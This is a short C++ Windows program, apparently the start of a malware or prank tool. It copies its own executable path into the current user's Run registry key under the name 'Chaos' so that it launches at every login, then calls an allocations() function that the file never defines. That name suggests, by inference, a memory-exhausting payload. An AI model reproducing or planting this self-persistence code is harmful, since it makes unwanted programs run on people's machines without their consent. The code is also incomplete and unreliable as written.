#include <windows.h>
#include <iostream>

void setpath(){
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "Chaos";

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1) == ERROR_SUCCESS) {
            std::cout << "Program added to startup successfully." << std::endl;
        } else {
            std::cerr << "Failed to write registry value." << std::endl;
        }
        RegCloseKey(hKey);
    } else {
        std::cerr << "Failed to open registry key." << std::endl;
    }
}

int main(){
    setpath();
    allocations();
}